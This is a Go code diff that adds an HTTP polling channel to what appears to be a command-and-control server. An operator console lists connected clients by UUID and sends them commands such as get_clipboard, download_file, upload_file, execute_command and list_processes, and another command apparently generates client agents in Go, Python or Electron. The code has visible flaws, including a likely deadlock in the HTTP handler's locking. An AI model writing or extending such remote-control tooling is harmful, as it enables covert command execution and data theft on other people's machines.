@@ -10,6 +10,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"time"
 
 	"github.com/chzyer/readline"
 	"github.com/fatih/color"
@@ -18,17 +19,21 @@ import (
 )
 
 type Client struct {
-	Conn *websocket.Conn
-	UUID string
-	Addr string
+	Conn         *websocket.Conn
+	UUID         string
+	Addr         string
+	ResponseChan chan string
 }
 
 type ClientManager struct {
-	Clients          map[string]*Client
-	mu               sync.RWMutex
-	addClientChan    chan *Client
-	removeClientChan chan string
-	messageChan      chan Message
+	HTTPClients               map[string]*Client
+	WebSocketClients          map[string]*Client
+	mu                        sync.RWMutex
+	addHTTPClientChan         chan *Client
+	removeHTTPClientChan      chan string
+	addWebSocketClientChan    chan *Client
+	removeWebSocketClientChan chan string
+	messageChan               chan Message
 }
 
 type Message struct {
@@ -71,38 +76,61 @@ func PrintHelp() {
 
 func NewClientManager() *ClientManager {
 	return &ClientManager{
-		Clients:          make(map[string]*Client),
-		addClientChan:    make(chan *Client),
-		removeClientChan: make(chan string),
-		messageChan:      make(chan Message),
+		HTTPClients:               make(map[string]*Client),
+		WebSocketClients:          make(map[string]*Client),
+		addHTTPClientChan:         make(chan *Client),
+		removeHTTPClientChan:      make(chan string),
+		addWebSocketClientChan:    make(chan *Client),
+		removeWebSocketClientChan: make(chan string),
+		messageChan:               make(chan Message),
 	}
 }
 
 func (cm *ClientManager) Start() {
 	for {
 		select {
-		case client := <-cm.addClientChan:
+		case client := <-cm.addHTTPClientChan:
 			cm.mu.Lock()
-			cm.Clients[client.UUID] = client
+			cm.HTTPClients[client.UUID] = client
 			cm.mu.Unlock()
-			fmt.Printf("New connection: %s, UUID: %s\n", client.Addr, client.UUID)
+			fmt.Printf("New HTTP connection: %s, UUID: %s\n", client.Addr, client.UUID)
 
-		case uuid := <-cm.removeClientChan:
+		case uuid := <-cm.removeHTTPClientChan:
 			cm.mu.Lock()
-			delete(cm.Clients, uuid)
+			delete(cm.HTTPClients, uuid)
 			cm.mu.Unlock()
-			fmt.Printf("Connection closed: UUID: %s\n", uuid)
+			fmt.Printf("HTTP connection closed: UUID: %s\n", uuid)
+
+		case client := <-cm.addWebSocketClientChan:
+			cm.mu.Lock()
+			cm.WebSocketClients[client.UUID] = client
+			cm.mu.Unlock()
+			fmt.Printf("New WebSocket connection: %s, UUID: %s\n", client.Addr, client.UUID)
+
+		case uuid := <-cm.removeWebSocketClientChan:
+			cm.mu.Lock()
+			delete(cm.WebSocketClients, uuid)
+			cm.mu.Unlock()
+			fmt.Printf("WebSocket connection closed: UUID: %s\n", uuid)
 
 		case msg := <-cm.messageChan:
 			cm.mu.RLock()
-			if client, exists := cm.Clients[msg.UUID]; exists {
+			if client, exists := cm.WebSocketClients[msg.UUID]; exists {
 				response := map[string]string{"command": msg.Content}
 				data, _ := json.Marshal(response)
 				if err := client.Conn.WriteMessage(websocket.TextMessage, data); err != nil {
-					fmt.Printf("Failed to send message: %v\n", err)
+					fmt.Printf("Failed to send WebSocket message: %v\n", err)
 				} else {
-					fmt.Printf("Message sent to UUID: %s, Content: %s\n", msg.UUID, msg.Content)
+					fmt.Printf("WebSocket message sent to UUID: %s, Content: %s\n", msg.UUID, msg.Content)
 				}
+			} else if client, exists := cm.HTTPClients[msg.UUID]; exists {
+				response := map[string]string{"command": msg.Content}
+				jsonResponse, err := json.Marshal(response)
+				if err != nil {
+					fmt.Printf("Failed to marshal response to JSON: %v\n", err)
+				}
+				client.ResponseChan <- string(jsonResponse)
+				fmt.Printf("HTTP message queued for UUID: %s, Content: %s\n", msg.UUID, msg.Content)
 			} else {
 				fmt.Printf("Connection not found: %s\n", msg.UUID)
 			}
@@ -111,8 +139,34 @@ func (cm *ClientManager) Start() {
 	}
 }
 
-func httpHandler(w http.ResponseWriter, r *http.Request) {
-	fmt.Fprintln(w, "HTTP server is running")
+func httpHandler(cm *ClientManager, w http.ResponseWriter, r *http.Request) {
+	uuid := r.Header.Get("UUID")
+	fmt.Printf("http Connection found\n")
+	if uuid == "" {
+		http.Error(w, "UUID is required", http.StatusBadRequest)
+		return
+	}
+
+	cm.mu.Lock()
+	client, exists := cm.HTTPClients[uuid]
+	if !exists {
+		client = &Client{
+			UUID:         uuid,
+			Addr:         r.RemoteAddr,
+			ResponseChan: make(chan string),
+		}
+		cm.HTTPClients[uuid] = client
+	}
+	cm.addHTTPClientChan <- client
+	cm.mu.Unlock()
+
+	select {
+	case response := <-client.ResponseChan:
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(response))
+	case <-time.After(30 * time.Second):
+		http.Error(w, "No response", http.StatusGatewayTimeout)
+	}
 }
 
 func wsHandler(cm *ClientManager, conn *websocket.Conn) {
@@ -122,7 +176,7 @@ func wsHandler(cm *ClientManager, conn *websocket.Conn) {
 	newUUID := uuid.New().String()
 	client := &Client{Conn: conn, UUID: newUUID, Addr: address}
 
-	cm.addClientChan <- client
+	cm.addWebSocketClientChan <- client
 	successMessage := map[string]string{"status": "success", "message": "Connection successful", "uuid": newUUID}
 	data, _ := json.Marshal(successMessage)
 	conn.WriteMessage(websocket.TextMessage, data)
@@ -130,19 +184,40 @@ func wsHandler(cm *ClientManager, conn *websocket.Conn) {
 	for {
 		_, message, err := conn.ReadMessage()
 		if err != nil {
-			cm.removeClientChan <- newUUID
+			cm.removeWebSocketClientChan <- newUUID
 			break
 		}
 		fmt.Printf("Received message from %s: %s\n", address, message)
 	}
 }
 
-func listClients(cm *ClientManager) []string {
+func listClients(cm *ClientManager, protocal string) []string {
 	cm.mu.RLock()
 	defer cm.mu.RUnlock()
 	var uuids []string
-	for _, client := range cm.Clients {
-		uuids = append(uuids, client.UUID)
+	switch protocal {
+	case "http":
+		{
+			for _, client := range cm.HTTPClients {
+				uuids = append(uuids, client.UUID)
+			}
+
+		}
+	case "websocket":
+		{
+			for _, client := range cm.WebSocketClients {
+				uuids = append(uuids, client.UUID)
+			}
+		}
+	case "all":
+		{
+			for _, client := range cm.WebSocketClients {
+				uuids = append(uuids, client.UUID)
+			}
+			for _, client := range cm.HTTPClients {
+				uuids = append(uuids, client.UUID)
+			}
+		}
 	}
 	return uuids
 }
@@ -236,12 +311,20 @@ func handleGenerateCommand(params []string) {
 
 func handleUseCommand(cm *ClientManager, uuid string) {
 	cm.mu.RLock()
-	_, exists := cm.Clients[uuid]
+	var client *Client
+	var exists bool
+	if cm.HTTPClients[uuid] != nil {
+		client, exists = cm.HTTPClients[uuid]
+	} else if cm.WebSocketClients[uuid] != nil {
+		client, exists = cm.WebSocketClients[uuid]
+	} else {
+		fmt.Printf("No Client to use \n")
+		return
+	}
 	cm.mu.RUnlock()
-
 	if !exists {
 		color.Set(color.FgRed)
-		fmt.Println("Connection not found")
+		fmt.Println("Connection not found1")
 		color.Unset()
 		return
 	}
@@ -277,14 +360,35 @@ func handleUseCommand(cm *ClientManager, uuid string) {
 			break
 		}
 
-		// Handle special commands
 		switch message {
 		case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes":
-			sendMessageToClient(cm, uuid, message)
+			if client.Conn != nil {
+				sendMessageToClient(cm, uuid, message)
+			} else if client.ResponseChan != nil {
+				select {
+				case client.ResponseChan <- message:
+					fmt.Printf("Command sent to HTTP client UUID %s: %s\n", uuid, message)
+				default:
+					fmt.Printf("HTTP client UUID %s is not waiting for a response\n", uuid)
+				}
+			} else {
+				fmt.Printf("Client UUID %s has no active connection\n", uuid)
+			}
 		case "help":
 			PrintUseCommandHelp()
 		default:
-			sendMessageToClient(cm, uuid, message)
+			if client.Conn != nil {
+				sendMessageToClient(cm, uuid, message)
+			} else if client.ResponseChan != nil {
+				select {
+				case client.ResponseChan <- message:
+					fmt.Printf("Command sent to HTTP client UUID %s: %s\n", uuid, message)
+				default:
+					fmt.Printf("HTTP client UUID %s is not waiting for a response\n", uuid)
+				}
+			} else {
+				fmt.Printf("Client UUID %s has no active connection\n", uuid)
+			}
 		}
 	}
 }
@@ -333,18 +437,10 @@ func main() {
 	go cm.Start()
 
 	config := readline.Config{
-		Prompt:      "Enter command: ",
-		HistoryFile: ".readline.tmp",
-		AutoComplete: readline.NewPrefixCompleter(
-			readline.PcItem("http"),
-			readline.PcItem("websocket"),
-			readline.PcItem("list", readline.PcItem("websocket")),
-			readline.PcItem("use"),
-			readline.PcItem("generate"),
-			readline.PcItem("help"),
-		),
+		Prompt:       "Enter command: ",
+		HistoryFile:  ".readline.tmp",
+		AutoComplete: readline.NewPrefixCompleter(),
 	}
-
 	rl, err := readline.NewEx(&config)
 	if err != nil {
 		fmt.Println("Failed to initialize readline:", err)
@@ -354,7 +450,7 @@ func main() {
 
 	go func() {
 		for {
-			uuids := listClients(cm)
+			uuids := listClients(cm, "all")
 			var completers []readline.PrefixCompleterInterface
 			for _, uuid := range uuids {
 				completers = append(completers, readline.PcItem(uuid))
@@ -362,7 +458,7 @@ func main() {
 			rl.Config.AutoComplete = readline.NewPrefixCompleter(
 				readline.PcItem("http"),
 				readline.PcItem("websocket"),
-				readline.PcItem("list", readline.PcItem("http"), readline.PcItem("websocket")),
+				readline.PcItem("list", readline.PcItem("http"), readline.PcItem("websocket"), readline.PcItem("all")),
 				readline.PcItem("use", completers...),
 				readline.PcItem("generate",
 					readline.PcItem("--lang", readline.PcItem("go"), readline.PcItem("python"), readline.PcItem("electron")),
@@ -394,7 +490,10 @@ func main() {
 				fmt.Println("Usage: use <UUID>")
 			}
 		case "http":
-			go http.ListenAndServe(":8080", http.HandlerFunc(httpHandler))
+			http.HandleFunc("/client", func(w http.ResponseWriter, r *http.Request) {
+				httpHandler(cm, w, r)
+			})
+			go http.ListenAndServe(":8080", nil)
 			color.Set(color.FgYellow)
 			fmt.Println("HTTP server started on port 8080")
 			color.Unset()
@@ -415,9 +514,25 @@ func main() {
 			color.Unset()
 		case "list":
 			if len(command) > 1 && command[1] == "websocket" {
-				uuids := listClients(cm)
+				uuids := listClients(cm, "websocket")
 				fmt.Println("Active WebSocket sessions:")
 				for _, uuid := range uuids {
+					fmt.Println("UUID:", uuid)
+				}
+			} else if len(command) > 1 && command[1] == "http" {
+				uuids := listClients(cm, "http")
+				fmt.Println("Active http sessions:")
+				for _, uuid := range uuids {
+					fmt.Println("UUID:", uuid)
+				}
+			} else if len(command) > 1 && command[1] == "all" {
+				uuids_http := listClients(cm, "http")
+				fmt.Println("All sessions:")
+				for _, uuid := range uuids_http {
+					fmt.Println("UUID:", uuid)
+				}
+				uuids_websocket := listClients(cm, "websocket")
+				for _, uuid := range uuids_websocket {
 					fmt.Println("UUID:", uuid)
 				}
 			} else {
